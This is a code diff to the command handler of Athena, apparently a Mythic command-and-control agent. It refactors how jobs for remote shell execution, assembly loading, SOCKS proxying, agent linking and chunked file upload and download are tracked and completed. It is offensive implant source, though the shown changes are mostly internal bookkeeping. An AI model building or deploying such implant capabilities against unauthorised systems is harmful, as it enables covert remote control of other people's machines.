@@ -15,14 +15,16 @@ namespace Athena.Commands
     {
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; set; }
-        private UploadHandler uploadHandler { get; set; }
         private DownloadHandler downloadHandler { get; set; }
+        private ShellHandler shellHandler { get; set; }
+        private UploadHandler uploadHandler { get; set; }
         private ConcurrentBag<object> responseResults { get; set; }
         public CommandHandler()
         {
             this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
             this.downloadHandler = new DownloadHandler();
+            this.shellHandler = new ShellHandler();
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
         }
@@ -48,6 +50,7 @@ namespace Athena.Commands
                     break;
                 case "jobs": //Can likely be dynamically loaded
                     this.responseResults.Add(await this.GetJobs(task.id));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
                     this.responseResults.Add(new ResponseResult
@@ -56,24 +59,31 @@ namespace Athena.Commands
                         completed = "true",
                         task_id = job.task.id,
                     });
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "link":
                     this.responseResults.Add(await Globals.mc.MythicConfig.forwarder.Link(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "load":
                     this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "load-assembly":
                     this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "reset-assembly-context":
                     this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "shell": //Can be dynamically loaded
-                    this.responseResults.Add(await Execution.ShellExec(job));
+                    this.responseResults.Add(await this.shellHandler.ShellExec(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "sleep":
                     this.responseResults.Add(await this.SetSleep(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
                     if(await Globals.socksHandler.Start())
@@ -85,6 +95,7 @@ namespace Athena.Commands
                             task_id = job.task.id,
                         });
                     }
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "stop-assembly":
                     this.responseResults.Add(new ResponseResult
@@ -93,8 +104,10 @@ namespace Athena.Commands
                         completed = "true",
                         task_id = job.task.id,
                     });
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "unlink":
+                    this.activeJobs.Remove(task.id, out _);
                     break;
                 case "upload": //Can likely be dynamically loaded
                     if(!await downloadHandler.ContainsJob(job.task.id))
@@ -106,7 +119,6 @@ namespace Athena.Commands
                     this.responseResults.Add(await CheckAndRunPlugin(job));
                     break;
             }
-            this.activeJobs.Remove(task.id, out _);
         }
         public async Task StopJob(MythicTask task)
         {
@@ -115,6 +127,16 @@ namespace Athena.Commands
         public async Task<List<object>> GetResponses()
         {
             List<object> responses = this.responseResults.ToList<object>();
+            if (this.assemblyHandler.assemblyIsRunning)
+            {
+                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
+            }
+
+            if (await this.shellHandler.HasRunningJobs())
+            {
+                responses.AddRange(await this.shellHandler.GetOutput());
+            }
+
             this.responseResults.Clear();
             return responses;
         }
@@ -178,13 +200,10 @@ namespace Athena.Commands
         public async Task HandleUploadPiece(MythicResponseResult response)
         {
             MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
-
             if (uploadJob.complete)
             {
                 await this.uploadHandler.CompleteUploadJob(response.task_id);
             }
-
-
             if(uploadJob.total_chunks == 0)
             {
                 uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
@@ -192,9 +211,11 @@ namespace Athena.Commands
             if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
             {
                 await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
-                
-                if (response.chunk_num == uploadJob.total_chunks-1)
+                uploadJob.chunk_num++;
+                if (response.chunk_num == uploadJob.total_chunks)
                 {
+                    await this.uploadHandler.CompleteUploadJob(response.task_id);
+                    this.activeJobs.Remove(response.task_id, out _);
                     this.responseResults.Add(new UploadResponse
                     {
                         task_id=response.task_id,
@@ -207,9 +228,6 @@ namespace Athena.Commands
                             full_path = uploadJob.path
                         }
                     });
-
-                    await this.uploadHandler.CompleteUploadJob(response.task_id);
-                    this.activeJobs.Remove(response.task_id, out _);
                 }
                 else
                 {
@@ -224,19 +242,29 @@ namespace Athena.Commands
                             full_path = uploadJob.path
                         }
                     });
-
-                    uploadJob.chunk_num++;
-                    Console.WriteLine(uploadJob.chunk_num);
                 }
-                
+
+            }
+            else
+            {
+                this.responseResults.Add(new ResponseResult
+                {
+                    status = "error",
+                    completed = "true",
+                    task_id = response.task_id,
+                    user_output = "Mythic sent no data to upload!"
+
+                });
             }
         }
         public async Task HandleDownloadPiece(MythicResponseResult response)
         {
             MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
 
-            if (String.IsNullOrEmpty(response.file_id))
+            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
             {
+                await this.downloadHandler.CompleteDownloadJob(response.task_id);
+                this.activeJobs.Remove(response.task_id, out _);
                 this.responseResults.Add(new DownloadResponse
                 {
                     task_id = response.task_id,
@@ -247,7 +275,7 @@ namespace Athena.Commands
             }
             else
             {
-                if (String.IsNullOrEmpty(response.file_id))
+                if (String.IsNullOrEmpty(downloadJob.file_id))
                 {
                     downloadJob.file_id = response.file_id;
                 }
